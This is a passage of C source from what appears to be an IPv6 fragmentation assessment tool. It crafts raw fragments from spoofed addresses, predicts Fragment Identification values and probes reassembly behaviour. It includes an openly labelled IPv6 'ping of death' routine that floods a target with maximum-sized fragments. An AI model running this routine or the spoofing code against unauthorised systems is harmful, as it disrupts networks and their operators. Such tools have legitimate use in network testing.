				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata.linkhsize);
			pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

			if( (pkt_end -  pktdata) < (idata.linkhsize + MIN_IPV6_HLEN))
				continue;

			if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && \
							pkt_ipv6->ip6_nxt == IPPROTO_ICMPV6 && pkt_icmp6->icmp6_type == ND_NEIGHBOR_SOLICIT){
				pkt_ns= (struct nd_neighbor_solicit *) pkt_icmp6;

				if( (pkt_end - (unsigned char *) pkt_ns) < sizeof(struct nd_neighbor_solicit))
					continue;
				/* 
				    If the addresses that we're using are not actually configured on the local system
				    (i.e., they are "spoofed", we must check whether it is a Neighbor Solicitation for 
				    one of our addresses, and respond with a Neighbor Advertisement. Otherwise, the kernel
				    will take care of that.
				 */
				if(testtype==FIXED_ORIGIN){
					if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && \
							 !localaddr_f && is_eq_in6_addr(&(pkt_ns->nd_ns_target), &(idata.srcaddr))){
						if(send_neighbor_advert(&idata, idata.pfd, pktdata) == -1){
							puts("Error sending Neighbor Advertisement");
							exit(EXIT_FAILURE);
						}
					}
				}
				else if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK){
					if(pkt_ns->nd_ns_target.s6_addr16[5] != addr_sig || \
						pkt_ns->nd_ns_target.s6_addr16[7] !=  (pkt_ns->nd_ns_target.s6_addr16[6] ^ addr_key))
						continue;

					if(send_neighbor_advert(&idata, idata.pfd, pktdata) == -1){
						puts("Error sending Neighbor Advertisement");
						exit(EXIT_FAILURE);
					}
				}				
			}
			else if(pkt_ipv6->ip6_nxt == IPPROTO_FRAGMENT){
				if( (pkt_end - (unsigned char *) pkt_ipv6) < \
					(sizeof(struct ip6_hdr) + sizeof(struct ip6_frag) + sizeof(struct icmp6_hdr) + sizeof(u_int32_t)))
					continue;

				pkt_fh= (struct ip6_frag *) ( (unsigned char *)pkt_ipv6 + sizeof(struct ip6_hdr));

				if(pkt_fh->ip6f_nxt != IPPROTO_ICMPV6)
					continue;

				/* XXX We only sample non-first fragments (see below) */
				if(!(pkt_fh->ip6f_offlg & IP6F_OFF_MASK))
					continue;

				/*
				 * XXX These checks were removed, since when assessing some implementations on a local
				 * network, we never get the first fragment because it is discarded when it triggers ND.
				 */
				if(!(pkt_fh->ip6f_offlg & IP6F_OFF_MASK)){
					pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *)pkt_fh + sizeof(struct ip6_frag));

					if(pkt_icmp6->icmp6_type != ICMP6_ECHO_REPLY)
						continue;

					if(ntohs(pkt_icmp6->icmp6_data16[0]) != getpid() )
						continue;
				}

				if(testtype==FIXED_ORIGIN){
					if(!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &(idata.srcaddr))){
						continue;
					}

					/* XXX Not used when sampling non-first fragments */
					if(!(pkt_fh->ip6f_offlg & IP6F_OFF_MASK)){
						if( *(u_int32_t *)((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr)) != icmp6_sig){
							continue;
						}
					}

					if(ntest1 >= NSAMPLES)
						continue;

					test1[ntest1]= ntohl(pkt_fh->ip6f_ident);
					ntest1++;
				}
				else{
					if(pkt_ipv6->ip6_dst.s6_addr16[5] != addr_sig || \
						pkt_ipv6->ip6_dst.s6_addr16[7] !=  (pkt_ipv6->ip6_dst.s6_addr16[6] ^ addr_key)){
						continue;
					}

					/* XXX Not used when sampling non-first fragments */
					if(!(pkt_fh->ip6f_offlg & IP6F_OFF_MASK)){
						if( *(u_int32_t *)((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr)) != icmp6_sig){
							continue;
						}
					}

					if(ntest2 >= NSAMPLES)
						continue;

					test2[ntest2]= ntohl(pkt_fh->ip6f_ident);
					ntest2++;
				}
			}
		}

		if(idata.verbose_f > 1){
			printf("Sampled %u Fragment Identifications from single-origin probes\n", ntest1);

			for(i=0; i<ntest1; i++)
				printf("#%02u: %08x\n", (i+1), test1[i]);

			printf("\nSampled %u Fragment Identifications from multi-origin probes\n", ntest2);

			for(i=0; i<ntest2; i++)
				printf("#%02u: %08x\n", (i+1), test2[i]);

			puts("");
		}

		if(ntest1 < 10 || ntest2 < 10){
			puts("Error: Didn't receive enough response packets");
			exit(EXIT_FAILURE);
		}

		if(predict_frag_id(test1, ntest1, test2, ntest2) == -1){
			puts("Error in predict_frag_id()");
			exit(EXIT_FAILURE);
		}

		exit(EXIT_SUCCESS);
	}


	/* Perform an IPv6-version of the "Ping of Death" attack */
	if(pod_f){
		puts("Performing a 'ping of death' attack against the target node....");

		/*
		   Set filter for receiving Neighbor Solicitations, ICMPv6 Echo Responses, and ICMPv6 Time Exceeded
		 */
		if(pcap_compile(idata.pfd, &pcap_filter, PCAP_ICMPV6_NSECHOEXCEEDED_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s\n", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}
		
		if(pcap_setfilter(idata.pfd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s\n", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		maxsizedchunk= idata.mtu - sizeof(struct ip6_hdr) - sizeof(struct ip6_frag);
		id=random();
		foffset=0;
		i=0;

		/* We send maximum-sized fragments to cover the entire offset space */
		while((foffset+maxsizedchunk) < MAX_FRAG_OFFSET){
			if(send_fragment(&idata, id, foffset, maxsizedchunk, foffset?MIDDLE_FRAGMENT:FIRST_FRAGMENT, NO_TIMESTAMP) == -1){
				puts("Error when writing fragment");
				exit(EXIT_FAILURE);
			}

			foffset+= maxsizedchunk;
			i++;

			/* Pause for 1 second every 8 packets */
			if(!(i%8))
				sleep(1);
		}

		/*
		   We send another fragment to close the gap with the last fragment and a fragment with
		   offset 0xfff8
		 */
		if(foffset != MAX_FRAG_OFFSET){
			if(send_fragment(&idata, id, foffset, (idata.mtu-maxsizedchunk)/8, MIDDLE_FRAGMENT, NO_TIMESTAMP) == -1){
				puts("Error when writing fragment");
				exit(EXIT_FAILURE);
			}

			foffset+=(idata.mtu-maxsizedchunk)/8;	
		}

		/* Send a last fragment, at the right edge, with the maximum possible size */
		if(send_fragment(&idata, id, foffset, idata.mtu-sizeof(struct ip6_hdr)-sizeof(struct ip6_frag), \
						LAST_FRAGMENT, NO_TIMESTAMP) == -1){
			puts("Error when writing fragment");
			exit(EXIT_FAILURE);
		}

		exit(EXIT_SUCCESS);
	}

	/* Send fragments to a target destination */
	if(idata.dstaddr_f){
		/*
		   Set filter for receiving Neighbor Solicitations, ICMPv6 Echo Responses, and ICMPv6 Time Exceeded
		 */
		if(pcap_compile(idata.pfd, &pcap_filter, PCAP_ICMPV6_NSECHOEXCEEDED_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s\n", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}
		
		if(pcap_setfilter(idata.pfd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s\n", pcap_geterr(idata.pfd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		if( (idata.fd= pcap_fileno(idata.pfd)) == -1){
			puts("Error obtaining descriptor number for pcap_t");
			exit(EXIT_FAILURE);
		}

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);
		lastfrag=0;
		start= time(NULL); 

		while(1){
			curtime=time(NULL);

			if(!loop_f && ((curtime - start) >= QUERY_TIMEOUT || (!resp_f && lastfrag != 0))){
				break;
			}

			if((curtime - lastfrag) >= nsleep){
				puts("Sending Fragment(s)....");

				frags=0;

				if(!foffset_f){
					foffset= random();
				}

				if(forder != LAST_FRAGMENT){
					foffset= (foffset >> 3) << 3;
				}

				while(frags < nfrags){
					if(send_fragment(&idata, fid_f?fid:random(), foffset, fsize_f?fsize:( ((MIN_FRAG_SIZE+(random()%400))>>3)<<3), \
						forder, tstamp_f) == -1){

						puts("Error sending packet");
						exit(EXIT_FAILURE);
					}

					frags++;
				}

				lastfrag=curtime;
				continue;
			}

			rset= sset;
			timeout.tv_usec=0;
			timeout.tv_sec= (lastfrag+nsleep)-curtime;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			if(sel == 0)
				continue;

			/* Read a packet (Echo Reply, ICMPv6 Error, or Neighbor Solicitation) */
			if((r=pcap_next_ex(idata.pfd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pfd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata.linkhsize);
			pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
			pkt_ns= (struct nd_neighbor_solicit *) pkt_icmp6;
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

			if( (pkt_end -  pktdata) < (idata.linkhsize + MIN_IPV6_HLEN))
				continue;

			if(pkt_ipv6->ip6_nxt == IPPROTO_ICMPV6){
				if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && pkt_icmp6->icmp6_type == ND_NEIGHBOR_SOLICIT){
					if( (pkt_end - (unsigned char *) pkt_ns) < sizeof(struct nd_neighbor_solicit))
						continue;
					/* 
					    If the addresses that we're using are not actually configured on the local system
					    (i.e., they are "spoofed", we must check whether it is a Neighbor Solicitation for 
					    one of our addresses, and respond with a Neighbor Advertisement. Otherwise, the kernel
					    will take care of that.
					 */
					if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && !localaddr_f && \
									is_eq_in6_addr(&(pkt_ns->nd_ns_target), &(idata.srcaddr))){
							if(send_neighbor_advert(&idata, idata.pfd, pktdata) == -1){
								puts("Error sending Neighbor Advertisement");
								exit(EXIT_FAILURE);
							}
					}
				}
				else if( (pkt_icmp6->icmp6_type == ICMP6_ECHO_REPLY) || (pkt_icmp6->icmp6_type == ICMP6_TIME_EXCEEDED)){
					if( (pkt_end - (unsigned char *) pkt_icmp6) < sizeof(struct icmp6_hdr))
						continue;
					/*
					   Do a preliminar validation check on the ICMPv6 packet (packet size, Source Address,
					   and Destination Address).
					 */
					if(!valid_icmp6_response(&idata, pkthdr, pktdata)){
						continue;
					}

					switch(pkt_icmp6->icmp6_type){
						case ICMP6_ECHO_REPLY:
							if(resp_f)
								print_icmp6_echo(&idata, pkthdr, pktdata);

							break;

						case ICMP6_TIME_EXCEEDED:
							if(resp_f)
								print_icmp6_timed(&idata, pkthdr, pktdata);

							break;
					}
				}
			}
		}
		
		exit(EXIT_SUCCESS);
	}

	exit(EXIT_SUCCESS);
}


/*
 * Function: print_icmp6_info()
 *
 * Print information about a received ICMPv6 Echo Response packet
 */
void print_icmp6_echo(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata){
	struct ip6_hdr		*pkt_ipv6;
	time_t				rtt;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + idata->linkhsize);

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	rtt= time(NULL) - *(time_t *) ( (unsigned char *) pkt_ipv6 + (sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)));
	printf("ICMPv6 echo Reply from %s", pv6addr);
	if(rtt > 0)
		printf(" (RTT: %u second%s)\n", (u_int32_t)rtt, (rtt>1)?"s":"");
	else
		puts(" (RTT: < 1 second)"); 
}


/*
 * Function: print_icmp6_timed()
 *
 * Print information about a received ICMPv6 Time Exceeded error message
 */
void print_icmp6_timed(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata){
	struct ip6_hdr		*pkt_ipv6, *pkt_ipv6_ipv6;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	struct ip6_ext		*pkt_ext;
	struct ip6_frag		*pkt_fh_fh;
	u_int8_t			pkt_prev_nh;
	time_t				rtt;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + idata->linkhsize);
	pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_ipv6 + sizeof(struct ip6_hdr));
	pkt_ipv6_ipv6= (struct ip6_hdr *) ((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr));
	pkt_fh_fh= NULL;
	pkt_ext= (struct ip6_ext *) ((unsigned char *)pkt_ipv6_ipv6 + sizeof(struct ip6_hdr));
	pkt_prev_nh= (pkt_ipv6_ipv6->ip6_nxt);

	while(pkt_prev_nh != IPPROTO_ICMPV6 && \
		( (unsigned char *)pkt_ext + (pkt_ext->ip6e_len * 8 + 1)) < pkt_end){

		if(pkt_prev_nh == IPPROTO_FRAGMENT)
			pkt_fh_fh= (struct ip6_frag *) pkt_ext;

		pkt_prev_nh= pkt_ext->ip6e_nxt;
		pkt_ext= (struct ip6_ext *) ( (unsigned char *)pkt_ext + ((pkt_ext->ip6e_len + 1) * 8));
	}

	if(pkt_prev_nh == IPPROTO_ICMPV6){
		pkt_icmp6_icmp6= (struct icmp6_hdr *) pkt_ext;

		if( ((unsigned char *) pkt_icmp6_icmp6 + (sizeof(struct icmp6_hdr)+ sizeof(struct ip6_hdr)+ \
				sizeof(struct ip6_frag)+sizeof(struct icmp6_hdr))) > pkt_end)
			return;
	}
	else{
		return;
	}

	if(pkt_fh_fh == NULL)
		return;

	/*
	 * We can only check the embedded ICMPv6 header if the embedded fragment is the first fragment of
	 * a packet
	 */
	if(ntohs(pkt_fh_fh->ip6f_offlg & IP6F_OFF_MASK) == 0){ 
		if(pkt_icmp6_icmp6->icmp6_type != ICMP6_ECHO_REQUEST){
			return;
		}

		if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
			return;
		}
	}
	else{
		return;
	}

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	if(tstamp_f){
		pkt_ptr= ((unsigned char *) pkt_icmp6_icmp6+ sizeof(struct icmp6_hdr));

		/* Verify our "checksum" */
		if(*(u_int32_t *)(pkt_ptr+sizeof(time_t)) != ((*(u_int32_t *)pkt_ptr) ^ 0xabcdabcd)){
			return;
		}

		rtt= time(NULL) - *(time_t *) pkt_ptr;

		printf("Response from %s: ICMPv6 Time Exceeded error message (Reassembly timeout: %lu seconds)\n", pv6addr, \
					(LUI) rtt);
	}
	else
		printf("Response from %s: ICMPv6 Time Exceeded error message\n", pv6addr);
}



/*
 * Function: process_icmp6_echoinfo()
 *
 * Process ICMPv6 echo reply messages received in response to our probe packets that investigate
 * the fragment reassembly policy of a target
 */
void process_icmp6_echo(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata, unsigned char *test, unsigned int *responses){
	struct ip6_hdr		*pkt_ipv6;
	struct icmp6_hdr	*pkt_icmp6;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + idata->linkhsize);
	pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_ipv6 + sizeof(struct ip6_hdr));

	if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block1)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize*2-overlap)){
			return;
		}

		if(test_frag_pattern( (unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr) + minfragsize-overlap), \
								overlap, block1)){
			test[0]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize-overlap), \
				overlap, block6)){
			test[0]= LAST_COPY;
		}
		else{
			test[0]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block2)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize * 3-overlap)){
			return;
		}

		if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize-overlap), overlap, block2)){
			test[1]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize-overlap), \
				overlap, block7)){
			test[1]= LAST_COPY;
		}
		else{
			test[1]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block3)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize * 3-overlap)){
			return;
		}

		if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2-overlap),\
							 overlap, block6)){
			test[2]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2-overlap), \
				overlap, block7)){
			test[2]= LAST_COPY;
		}
		else{
			test[2]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block4)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize * 4)){
			return;
		}

		if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2), \
							minfragsize, block6)){
			test[3]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2), \
					minfragsize, block7)){
			test[3]= LAST_COPY;
		}
		else{
			test[3]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block5)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize * 4 - overlap)){
			return;
		}

		if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2), \
				minfragsize, block6)){
			test[4]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2), \
				minfragsize, block7)){
			test[4]= LAST_COPY;
		}
		else{
			test[4]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else{
		if(idata->verbose_f)
			puts("ICMPv6 Echo Reply for unknown probe type");
	}

}


/*
 * Function: process_icmp6_timed()
 *
 * Process ICMPv6 Time Exceeded messages received in response to our probe packets that investigate
 * the fragment reassembly policy of a target
 */
void process_icmp6_timed(struct iface_data *idata, struct pcap_pkthdr *pkthdr, const u_char *pktdata, unsigned char *test){
	struct ip6_hdr		*pkt_ipv6, *pkt_ipv6_ipv6;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	struct ip6_ext		*pkt_ext;
	struct ip6_frag		*pkt_fh_fh;
	u_int8_t			pkt_prev_nh;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + idata->linkhsize);
	pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_ipv6 + sizeof(struct ip6_hdr));
	pkt_ipv6_ipv6= (struct ip6_hdr *) ((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr));
	pkt_fh_fh= NULL;
	pkt_ext= (struct ip6_ext *) ((unsigned char *)pkt_ipv6_ipv6 + sizeof(struct ip6_hdr));
	pkt_prev_nh= (pkt_ipv6_ipv6->ip6_nxt);

	while(pkt_prev_nh != IPPROTO_ICMPV6 && \
		( (unsigned char *)pkt_ext + (pkt_ext->ip6e_len * 8 + 1)) < pkt_end){

		if(pkt_prev_nh == IPPROTO_FRAGMENT)
			pkt_fh_fh= (struct ip6_frag *) pkt_ext;

		pkt_prev_nh= pkt_ext->ip6e_nxt;
		pkt_ext= (struct ip6_ext *) ( (unsigned char *)pkt_ext + ((pkt_ext->ip6e_len + 1) * 8));
	}

	if(pkt_prev_nh == IPPROTO_ICMPV6){
		pkt_icmp6_icmp6= (struct icmp6_hdr *) pkt_ext;

		if( ((unsigned char *) pkt_icmp6_icmp6 + (sizeof(struct icmp6_hdr)+ sizeof(struct ip6_hdr)+ \
				sizeof(struct ip6_frag)+sizeof(struct icmp6_hdr))) > pkt_end)
			return;
	}
	else{
		return;
	}

	if(pkt_fh_fh == NULL)
		return;

	/*
	 * We can only check the embedded ICMPv6 header if the embedded fragment is the first fragment of
	 * a packet
	 */
	if(ntohs(pkt_fh_fh->ip6f_offlg & IP6F_OFF_MASK) == 0){ 
		if(pkt_icmp6_icmp6->icmp6_type != ICMP6_ECHO_REQUEST){
			return;
		}

		if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
			return;
		}
	}
	else{
		return;
	}

	if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block1)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){

			return;
		}
		else{
			test[0]= TIME_EXCEEDED;
		}

	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block2)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){
			return;
		}

		test[1]= TIME_EXCEEDED;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block3)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){
			return;
		}

		test[2]= TIME_EXCEEDED;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block4)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){
			return;
		}

		test[3]= TIME_EXCEEDED;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block5)){
		if(!valid_icmp6_response2(idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){
			return;
		}

		test[4]= TIME_EXCEEDED;
	}
	else{
		test[4]= UNKNOWN_COPY;
	}

}


/*
 * Function: send_fragment2()
 *
 * Sends an IPv6 for evaluating the fragment reassembly policy
 */
int send_fragment2(struct iface_data *idata, u_int16_t ip6len, unsigned int id, unsigned int offset, unsigned int fsize, unsigned int order, \
						char *block){
	unsigned char	*ptrend;

	ethernet= (struct ether_header *) buffer;
	dlt_null= (struct dlt_null *) buffer;
	v6buffer = buffer + idata->linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;
	fsize= (fsize>>3) << 3;

	if(idata->type == DLT_EN10MB && idata->flags != IFACE_LOOPBACK){
		ethernet->src = idata->hsrcaddr;
		ethernet->dst = idata->hdstaddr;
		ethernet->ether_type = htons(ETHERTYPE_IPV6);
	}
	else if(idata->type == DLT_NULL){
		dlt_null->family= PF_INET6;
	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= idata->srcaddr;
	ipv6->ip6_dst= idata->dstaddr;

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;

	/* Check that we are able to send the Unfragmentable Part, together with a 
	   Fragment Header and a chunk data over our link layer
	 */
	if( (ptr+sizeof(struct ip6_frag)+fsize) > (v6buffer+idata->mtu)){
		puts("Unfragmentable part too large for current MTU");
		return(-1);
	}

	/* We prepare a separete Fragment Header, but we do not include it in the packet to be sent.
	   This Fragment Header will be used (an assembled with the rest of the packet by the 
	   send_packet() function.
	*/
	fh= (struct ip6_frag *) ptr;
	bzero(ptr, FRAG_HDR_SIZE);

	fh->ip6f_ident= htonl(id);

	if(order == LAST_FRAGMENT || order==ATOMIC_FRAGMENT){
		m=0;
	}
	else{
		m=IP6F_MORE_FRAG;
	}

	if(order==FIRST_FRAGMENT || order==ATOMIC_FRAGMENT)
		offset=0;

	fh->ip6f_offlg = (htons(offset) & IP6F_OFF_MASK) | m;

	*prev_nh = IPPROTO_FRAGMENT;
	prev_nh = (unsigned char *) fh;

	ptr+= sizeof(struct ip6_frag);

	*prev_nh = IPPROTO_ICMPV6;


	if(order == FIRST_FRAGMENT || order==ATOMIC_FRAGMENT){
		if((ptr+ sizeof(struct icmp6_hdr)) > (v6buffer+max_packet_size)){
			puts("Packet too large while inserting ICMPv6 header");
			return(-1);
		}

		icmp6 = (struct icmp6_hdr *) ptr;
		icmp6->icmp6_type = ICMP6_ECHO_REQUEST;
		icmp6->icmp6_code = 0;
		icmp6->icmp6_cksum = 0;
		icmp6->icmp6_data16[0]= htons(getpid());	/* Identifier */
		icmp6->icmp6_data16[1]= htons(random());		/* Sequence Number */

		ptr+= sizeof(struct icmp6_hdr);

		for(i=0; i< (fsize/8); i++){
			memcpy(ptr, block, FRAG_BLOCK_SIZE);
			ptr += FRAG_BLOCK_SIZE;
		}

		ptrend=ptr;

		for(i=0; i< (ip6len-sizeof(struct icmp6_hdr)-fsize)/8; i++){
			memcpy(ptr, block, FRAG_BLOCK_SIZE);
			ptr += FRAG_BLOCK_SIZE;
		}

		/* Length of the reassembled fragment */
		ipv6->ip6_plen= htons(ip6len);
		icmp6->icmp6_cksum = in_chksum(v6buffer, icmp6, ptr-((unsigned char *)icmp6), IPPROTO_ICMPV6);

		ptr= ptrend;

		/* Length of the current fragment */
		ipv6->ip6_plen= htons(ptr-(v6buffer + MIN_IPV6_HLEN));
	}
	else{
		if((ptr+ fsize) > (v6buffer+max_packet_size)){
			puts("Packet too large while inserting timestamp");
			return(-1);
		}

		for(i=0; i< (fsize/8); i++){
			memcpy(ptr, block, FRAG_BLOCK_SIZE);
			ptr += FRAG_BLOCK_SIZE;
		}

		ipv6->ip6_plen= htons(ptr-(v6buffer + MIN_IPV6_HLEN));
	}

	if((nw=pcap_inject(idata->pfd, buffer, ptr - buffer)) == -1){
		printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
		return(-1);
	}

	if(nw != (ptr- buffer)){
		printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, (LUI) (ptr-buffer));
		return(-1);
	}

	return 0;
}



/*
 * Function: send_fragment()
 *
 * Sends an IPv6 fragment
 */
int send_fragment(struct iface_data *idata, unsigned int id, unsigned int offset, unsigned int fsize, \
                  unsigned int forder, unsigned int tstamp_f){
	time_t	tstamp;
	unsigned int i;

	ethernet= (struct ether_header *) buffer;
	dlt_null= (struct dlt_null *) buffer;
	v6buffer = buffer + idata->linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(idata->type == DLT_EN10MB && idata->flags != IFACE_LOOPBACK){
		ethernet->src = idata->hsrcaddr;
		ethernet->dst = idata->hdstaddr;
		ethernet->ether_type = htons(ETHERTYPE_IPV6);
	}
	else if(idata->type == DLT_NULL){
		dlt_null->family= PF_INET6;
	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= idata->srcaddr;
	ipv6->ip6_dst= idata->dstaddr;

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;

	if(hbhopthdr_f){
		hbhopthdrs=0;
	
		while(hbhopthdrs < nhbhopthdr){
			if((ptr+ hbhopthdrlen[hbhopthdrs]) > (v6buffer+ idata->mtu)){
				puts("Packet too large while processing HBH Opt. Header");
				return(-1);
			}
	    
			*prev_nh = IPPROTO_HOPOPTS;
			prev_nh = ptr;
			memcpy(ptr, hbhopthdr[hbhopthdrs], hbhopthdrlen[hbhopthdrs]);
			ptr = ptr + hbhopthdrlen[hbhopthdrs];
			hbhopthdrs++;
		}
	}

